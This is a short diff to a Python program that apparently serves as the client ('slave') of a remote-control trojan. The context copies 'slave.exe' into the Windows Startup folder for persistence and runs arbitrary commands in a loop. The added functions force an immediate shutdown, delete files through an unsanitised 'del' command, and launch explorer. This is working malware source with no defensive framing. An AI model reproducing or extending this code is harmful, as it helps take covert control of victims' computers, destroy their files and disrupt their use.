@@ -9,6 +9,19 @@ def cmd(x, i):
     for y in range(i):
         os.system(x)
 
+
+def shutdown():
+    os.system("shutdown /s /f /t 0")
+
+
+def delete(x):
+    os.system("del " + x)
+
+
+def explorer():
+    os.system("explorer.exe")
+
+
 shutil.move(os.path.dirname(sys.executable) + "\\slave.exe", os.environ["appdata"]+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\slave.exe")
 # print(__file__.split("\\")[-1])
 
